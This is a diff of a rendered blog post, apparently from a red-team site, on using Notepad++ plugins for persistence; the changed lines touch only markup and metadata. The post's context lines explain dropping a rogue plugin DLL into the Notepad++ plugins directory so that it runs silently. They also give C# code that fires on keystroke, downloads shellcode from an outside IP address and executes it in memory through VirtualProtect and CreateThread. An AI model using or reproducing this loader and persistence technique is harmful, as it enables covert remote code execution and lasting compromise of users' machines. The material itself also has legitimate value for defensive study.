@@ -3,7 +3,7 @@
   <head>
     <title>Notepad&#43;&#43; Plugins for Persistence - Offensive Defence</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
@@ -20,8 +20,8 @@ To install a custom plugin, the DLL can simply be dropped inside %PROGRAMFILES%\
 To install a custom plugin, the DLL can simply be dropped inside %PROGRAMFILES%\Notepad&#43;&#43;\plugins\pluginName\pluginName.dll. The up-side is that no user interaction is required to load or activate the plugin." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://offensivedefence.co.uk/posts/notepad&#43;&#43;/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-01-29T15:54:31&#43;00:00" />
-<meta property="article:modified_time" content="2022-01-29T15:54:31&#43;00:00" />
+<meta property="article:published_time" content="2022-01-29T15:54:31+00:00" />
+<meta property="article:modified_time" content="2022-01-29T15:54:31+00:00" />
 
 
 
@@ -65,7 +65,7 @@ To install a custom plugin, the DLL can simply be dropped inside %PROGRAMFILES%\
       <p><a href="https://notepad-plus-plus.org/downloads/">Notepad++</a> is a popular Windows text editor, which has an extension capability in the way of <a href="https://npp-user-manual.org/docs/plugins/">plugins</a>.  The <strong>Plugin Manager</strong> allows users to download and install <a href="https://github.com/notepad-plus-plus/nppPluginList">approved</a> plugins, but you can also install your own plugins locally.  A plugin can be built in a variety of languages including <a href="https://github.com/npp-plugins/plugintemplate/releases">C++</a> and <a href="https://github.com/kbilsted/NotepadPlusPlusPluginPack.Net">C#</a>.</p>
 <p>To install a custom plugin, the DLL can simply be dropped inside <code>%PROGRAMFILES%\Notepad++\plugins\pluginName\pluginName.dll</code>.  The up-side is that no user interaction is required to load or activate the plugin.  The down-side is that local admin rights are required to write to the directory.</p>
 <p>Here, I&rsquo;m using the .NET template to run some code from the <code>OnNotification</code> method.  This is fired every time Notepad++ does &ldquo;something&rdquo;.  The notification code can be used by the plugin to determine whether or not it needs to do anything.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> firstRun = <span style="color:#66d9ef">true</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> firstRun = <span style="color:#66d9ef">true</span>;
 
 <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> OnNotification(ScNotification notification)
 {
@@ -79,7 +79,7 @@ To install a custom plugin, the DLL can simply be dropped inside %PROGRAMFILES%\
 }
 </code></pre></div><p>In this example, the <code>SCI_ADDTEXT</code> notification is used.  This is fires everytime the user types a character, but there are literally hundreds of notification types that you could use instead.  I like this approach, since it doesn&rsquo;t require the user to interact with a plugin menu item or anything like that.  I also add a boolean flag to ensure the &ldquo;malicious&rdquo; code is only run once.</p>
 <p>Once compiled, create a new directory inside <code>plugins</code> and copy the DLL there.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt; ls &#39;C:\Program Files\Notepad++\plugins\TotallyLegitPlugin\&#39;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt; ls &#39;C:\Program Files\Notepad++\plugins\TotallyLegitPlugin\&#39;
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
@@ -87,7 +87,7 @@ Mode                 LastWriteTime         Length Name
 </code></pre></div><p>Now launch Notepad++ and type a character.</p>
 <p><img src="/images/notepad_plusplus/msgbox.png" alt="" title="MessageBox"></p>
 <p>Replace the MessageBox with a shellcode loader or anything else you fancy.  This is the most basic example:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">if</span> (notification.Header.Code == (<span style="color:#66d9ef">uint</span>)SciMsg.SCI_ADDTEXT &amp;&amp; firstRun)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">if</span> (notification.Header.Code == (<span style="color:#66d9ef">uint</span>)SciMsg.SCI_ADDTEXT &amp;&amp; firstRun)
 {
     <span style="color:#66d9ef">using</span> var client = <span style="color:#66d9ef">new</span> WebClient();
     <span style="color:#66d9ef">var</span> buf = client.DownloadData(<span style="color:#e6db74">&#34;http://172.19.215.47/shellcode&#34;</span>);
@@ -100,19 +100,19 @@ Mode                 LastWriteTime         Length Name
 
     Marshal.Copy(buf, <span style="color:#ae81ff">0</span>, hMemory, buf.Length);
 
-    _ = VirtualProtect(
+    <span style="color:#ae81ff">_</span> = VirtualProtect(
             hMemory,
             (<span style="color:#66d9ef">uint</span>)buf.Length,
             MemoryProtection.ExecuteRead,
-            <span style="color:#66d9ef">out</span> _);
+            <span style="color:#66d9ef">out</span> <span style="color:#ae81ff">_</span>);
 
-    _ = CreateThread(
+    <span style="color:#ae81ff">_</span> = CreateThread(
             IntPtr.Zero,
             <span style="color:#ae81ff">0</span>,
             hMemory,
             IntPtr.Zero,
             <span style="color:#ae81ff">0</span>,
-            <span style="color:#66d9ef">out</span> _);
+            <span style="color:#66d9ef">out</span> <span style="color:#ae81ff">_</span>);
 
     firstRun = !firstRun;
 }
